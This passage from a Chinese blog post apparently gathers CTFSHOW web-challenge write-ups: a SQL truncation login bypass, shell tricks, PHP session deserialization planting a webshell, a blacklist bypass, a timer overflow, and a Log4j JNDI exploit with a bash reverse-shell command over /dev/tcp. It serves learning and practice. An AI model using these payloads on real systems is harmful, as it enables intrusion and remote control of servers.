class="operator">&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这个代码中固定了用户名是admin，这里要用到sql的where特性<br>在 MySQL 中，<code>WHERE</code> 子句在比较字符串时会忽略字符串末尾的空格。例如，当执行 <code>SELECT * FROM table WHERE column = &#39;cs &#39;;</code> 时，MySQL 会将其视为 <code>&#39;cs&#39;</code> 进行比较，只要 <code>column</code> 列的值为 <code>&#39;cs&#39;</code> 就会匹配成功。这一特性可以用于绕过一些输入过滤机制。</p>
<ul>
<li><p><strong>CHAR 和 VARCHAR 列有最大长度限制</strong>：当给 <code>CHAR</code> 或 <code>VARCHAR</code> 列赋值时，如果值的长度超过了列的最大长度，就会对值进行裁剪以使其适合列的长度。</p>
</li>
<li><p><strong>严格 SQL 模式的影响</strong>：</p>
<ul>
<li><strong>严格模式下</strong>：如果被裁掉的字符不是空格，会产生错误并禁用值的插入。</li>
<li><strong>非严格模式下</strong>：不管被裁掉的字符是什么，都会直接截断值，不会产生错误。</li>
</ul>
</li>
</ul>
<p>但是如果我这个时候禁用了严格 SQL 模式，那么就会直接截断，不管后面是什么，这个才是这道题的解法。</p>
<p>设置非严格模式，配置文件加上 <code>sql_mode =&quot;&quot;</code> 就行<br><img src="https://pic1.imgdb.cn/item/67ac68c2d0e0a243d4fe9a4f.png" alt="|500"><br>所以注册的时候用户用admin然后很多空格，密码随便输入,这样就可以登录admin<br><img src="https://pic1.imgdb.cn/item/67ac68c7d0e0a243d4fe9a50.png"></p>
<h1 id="【nl】难了"><a href="#【nl】难了" class="headerlink" title="【nl】难了"></a>【nl】难了</h1><p>题目源码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])&lt;<span class="number">4</span>)&#123;  </span><br><span class="line">         <span class="keyword">echo</span><span class="title function_ invoke__"> shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">else</span>&#123;  </span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;hack!!!&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这里用1传入参数，但是长度小于4，先用ls指令看看有什么文件，发现flag文件特别长secretsecret_ctfshow_36dddddddddd.php，还有一个zzz.php<br>结合题目标题，猜测需要使用nl指令，但是不能直接用nl 因为不能直接输入文件名让nl执行。所以现在需要用到linux中的一个技巧，<code>*</code>通配符会执行所有的文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp/aa]</span><br><span class="line">└─# <span class="built_in">ls</span></span><br><span class="line">a  <span class="built_in">nl</span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp/aa]</span><br><span class="line">└─# *</span><br><span class="line">a: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure></div>
<p>比如我这里有两个文件，输入<code>*</code>，linux就会执行 a  和 nl，现在我们只要让nl再flag文件前面，然后用<code>*</code>执行就好，所以先创建一个nl文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https</span>://<span class="number">09260</span>a7d-e390-<span class="number">4428</span>-<span class="number">87</span>a8-e800f51f3670.challenge.ctf.show/?<span class="number">1</span>=&gt;nl</span><br><span class="line"><span class="attribute">https</span>://<span class="number">09260</span>a7d-e390-<span class="number">4428</span>-<span class="number">87</span>a8-e800f51f3670.challenge.ctf.show/?<span class="number">1</span>=*</span><br></pre></td></tr></table></figure></div>
<p>这样就可以通过执行nl 看flag文件,但是这里还是没法直接看，我们就把输出的结果重定向到到一个文件a中<code>?1=*&gt;a</code><br>最后访问url&#x2F;a就可以得到flag</p>
<h1 id="一切看起来都那么合情合理"><a href="#一切看起来都那么合情合理" class="headerlink" title="一切看起来都那么合情合理"></a>一切看起来都那么合情合理</h1><p>题目描述：程序员二黑临走前植入了一个后门，你能帮公司找出来吗？<br><img src="https://pic1.imgdb.cn/item/67ac68dbd0e0a243d4fe9a54.png"><br>如果随便登录一个账号密码就会提示登录失败，没有其他的回显. 题目提示和后门有关,这里再去<a target="_blank" rel="noopener" href="http://www.zip下载源码/">www.zip下载源码</a><br>index.php:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"> <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"> <span class="comment">//超过5次禁止登陆</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;登陆失败次数超过限制&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line">  <span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;limit&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line">   <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这里设置了一个SESSION值limit，这个SESSION我们可以控制。<code>我们就可以通过$_SESSION的值传递我们的payload入服务器的/tmp/sess_xxx生成我们构造的序列化payload</code><br>inc.php中的关键代码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">ini_set</span>(&#x27;display_errors&#x27;, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">ini_set</span>(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line"><span class="built_in">date_default_timezone_set</span>(&quot;Asia/Shanghai&quot;);</span><br><span class="line"><span class="built_in">session_start</span>();</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="variable">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>代码定义了一个User类，将利用file_put_contents()函数写入类属性值，现在我们就要利用session进行序列化执行User类的file_put_contents()函数写入一句话，得到flag<br>check.php:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;inc/inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$GET</span> = <span class="keyword">array</span>(<span class="string">&quot;u&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="string">&quot;pass&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>
<p>所以总的利用思路是利用index.php中的SESSION写入payload，而SESSION的数据会被存在服务器的&#x2F;tmp&#x2F;sess_xxx中，再用inc.php中的ini_set(‘session.serialize_handler’, ‘php’)来反序列化服务器上的&#x2F;tmp&#x2F;sess_xxxx文件，执行inc.php里面User类的file_put_contents()函数写入一句话<br>payload:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> =<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;&lt;?php system(&#x27;cat fl*&#x27;);?&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));<span class="comment">//进行base64编码，因为index.php是进行了base64解码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>直接进行序列化生成的是<code>O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;1.php&quot;;s:8:&quot;password&quot;;s:26:&quot;&lt;?php system(&#39;cat fl*&#39;);?&gt;&quot;;s:6:&quot;status&quot;;N;&#125;</code> 这个payload前面加上分割符|,然后进行base64 </p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">┌──(root㉿kakeru)-[~/tmp]</span></span><br><span class="line"><span class="language-xml">└─# echo &#x27;|O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;1.php&quot;;s:8:&quot;password&quot;;s:26:&quot;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fl*&#x27;</span>);<span class="meta">?&gt;</span></span><span class="language-xml">&quot;;s:6:&quot;status&quot;;N;&#125;&#x27; | base64</span></span><br><span class="line"><span class="language-xml">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7</span></span><br><span class="line"><span class="language-xml">czoyNjoiPD9waHAgc3lzdGVtKGNhdCBmbCopOz8+IjtzOjY6InN0YXR1cyI7Tjt9Cg==</span></span><br></pre></td></tr></table></figure>
<p>最后用bp打开抓包<br><img src="https://pic1.imgdb.cn/item/67ac694bd0e0a243d4fe9a75.png"><br>再给&#x2F;inc&#x2F;inc.php发包<br><img src="https://pic1.imgdb.cn/item/67ac6952d0e0a243d4fe9a77.png"><br><strong>但是有一个问题就是我们写入的 session 马上又会被删除，使用我们利用 bp 不断的发包然后访问 check.php 或者 inc&#x2F;inc.php 都可以</strong><br>修改cookie的值，然后log-1.php中查看<br><img src="https://pic1.imgdb.cn/item/67ac694dd0e0a243d4fe9a76.png"></p>
<h1 id="红包题-耗子尾汁"><a href="#红包题-耗子尾汁" class="headerlink" title="红包题 耗子尾汁"></a>红包题 耗子尾汁</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-11-30 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-11-30 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CTFSHOW_36_D</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$dis</span> = <span class="keyword">array</span>(<span class="string">&quot;var_dump&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;readfile&quot;</span>,<span class="string">&quot;highlight_file&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$a</span>,<span class="variable">$dis</span>,<span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">forward_static_call_array</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">CTFSHOW_36_D</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;rlezphp!!!&quot;</span>;</span><br><span class="line">hackerrlezphp!!!</span><br></pre></td></tr></table></figure></div>
<p>这里过滤了很多函数<br><code>forward_static_call_array()</code> 是 PHP 的一个内置函数，主要用于<strong>在运行时动态地调用一个静态方法</strong>，并且允许使用数组作为参数传递。它的作用类似于 <code>call_user_func_array()</code>，但适用于静态方法调用。<br>如果$a不在数组的系列名单中，就会执行 forward_static_call_array 方法。<br>构造 a 为一个命令，b 作为数组传递参数：payload：<code>?a=\system&amp;b []=ls</code> 使用反斜杠是因为这是在其他的类调用的系统函数 system，所以加上 \，也能绕过前面黑名单的验证：<br><img src="https://pic1.imgdb.cn/item/67ac6997d0e0a243d4fe9a8d.png"><br>接着b[]&#x3D;cat flag.php，在源码中可以看到flag</p>
<h1 id="新年好？"><a href="#新年好？" class="headerlink" title="新年好？"></a>新年好？</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> flag = <span class="built_in">require</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getflag</span>(<span class="params">flag</span>) &#123;</span><br><span class="line">      res.<span class="title function_">send</span>(flag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">10</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Number</span>.<span class="title function_">isInteger</span>(<span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">delay</span>))) &#123;</span><br><span class="line">      delay = <span class="title class_">Math</span>.<span class="title function_">max</span>(delay, <span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">delay</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = <span class="built_in">setTimeout</span>(getflag, delay,flag);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(t);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Timeout!&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./app.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
<p>这个代码是一个使用 <code>Express.js</code> 编写的简单 Web 服务器，监听 <code>3000</code> 端口，并提供两个路由：<code>/flag</code> 和 <code>/</code>。<br><code>setTimeout(getflag, delay,flag);</code> 在 delay 秒之后，会执行 getflag 方法，并且会将 flag 当做参数进行传入<br>浏览器内部使用 32 位带符号的整数，来储存推迟执行的时间。这意味着 setTimeout 最多只能推迟执行 2147483647 毫秒（24.8 天）超过这个时间会发生溢出。<br>如果溢出了之后，相当于从 0 开始，整数上溢，那么相当于我们可以控制只要在 1000 之内就可以<br>payload:<code>/flag?delay=2147483648</code></p>
<h1 id="红包一"><a href="#红包一" class="headerlink" title="红包一"></a>红包一</h1><p><img src="https://pic1.imgdb.cn/item/67ac698bd0e0a243d4fe9a8b.png"><br>用f12打开调试模式，搜索flag出现一个getflag的函数,在控制台输入getflag()就出现flag<br><img src="https://pic1.imgdb.cn/item/67ac6979d0e0a243d4fe9a80.png"></p>
<h1 id="Log4j-复现"><a href="#Log4j-复现" class="headerlink" title="Log4j 复现"></a>Log4j 复现</h1><p>题目描述：Log4j 复现，师傅们别到处 RCE 了<br><img src="https://pic1.imgdb.cn/item/67ac6975d0e0a243d4fe9a7f.png"><br>一个登录框，登录内容有回显<br>这题考查的是log4j  Log4j 漏洞又名 “Log4Shell”，是 2021 年 11 月在 Apache Log4j 日志记录库发现的一个严重漏洞。Log4Shell 本质上让黑客完全控制运行未打补丁 Log4j 版本的设备。<br>利用JNDIExploit工具 <br>使用方式</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">java</span> -jar JNDI-Injection-Exploit-<span class="number">1</span>.<span class="number">0</span>-SNAPSHOT-<span class="literal">all</span>.jar -C <span class="string">&quot;bash -c &#123;echo,(bash -i &gt;&amp; /dev/tcp/IP/12345 0&gt;&amp;1)的base64编码&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A <span class="string">&quot;IP&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>本机监听12345端口</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lnvp <span class="number">12345</span></span><br></pre></td></tr></table></figure></div>
<p>payload:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?u</span>ser=<span class="variable">$%</span>7<span class="symbol">Bjndi:</span><span class="symbol">rmi:</span>/<span class="regexp">/ip:1099/whsy</span>9k%7D</span><br></pre></td></tr></table></figure></div>

<p>注：本篇的wp非原创，本人也为ctf新手，仅供参考学习。</p>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>guayu-kakeru
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://guayu-kakeru.github.io/posts/3905.html" title="CTFSHOW第一部分web题wp整理">https://guayu-kakeru.github.io/posts/3905.html</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/CTF/" rel="tag"># CTF</a>
              <a href="/tags/web/" rel="tag"># web</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
